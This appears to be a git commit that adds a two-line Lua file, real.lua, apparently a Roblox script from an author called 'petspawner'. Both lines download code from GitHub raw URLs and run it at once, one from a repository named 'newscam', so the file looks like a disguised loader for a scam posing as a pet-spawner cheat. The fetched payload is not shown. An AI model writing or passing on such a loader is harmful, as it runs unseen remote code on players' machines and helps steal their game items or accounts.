693067ccd948090fe86e47bca73437c4854a221f
petspawner <taidepzai120408@gmail.com>
2025-09-25 21:54:04 +0700

    Create real.lua

---
+++ real.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vntai135/chunkhub/refs/heads/main/script"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vntai135/newscam/refs/heads/main/script"))()
